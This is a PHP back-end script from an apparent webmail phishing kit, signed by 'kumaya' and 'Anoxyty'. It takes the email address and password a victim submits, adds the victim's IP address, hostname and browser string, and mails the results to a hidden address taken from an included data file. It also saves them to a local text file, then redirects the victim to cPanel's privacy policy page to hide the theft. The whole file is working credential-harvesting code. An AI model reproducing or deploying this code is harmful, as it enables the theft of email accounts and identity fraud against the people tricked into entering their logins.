<?php 
/*       
// made by kumaya" // https://icq.im/kumaya "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
			if ( isset( $_POST['user2'] ) ) {
		
        $_SESSION['user2'] 	  = $_POST['user2'];
		$_SESSION['pass2'] 	  = $_POST['pass2'];
		$code = <<<EOT
============== [ WEBMAIL By kumaya | ]🔥 ==============
[EMAIL ADDRESS] 		: {$_SESSION['user2']}
[EMAIL PASSWORD]		: {$_SESSION['pass2']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./🏛️ WEBMAIL By kumaya 🏛️ ] =============
\r\n\r\n
EOT;

		$subject = "🏛️ WEBMAIL Email Acess By Anoxyty🏛️  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <webmailby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: https://cpanel.net/privacy-policy/");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>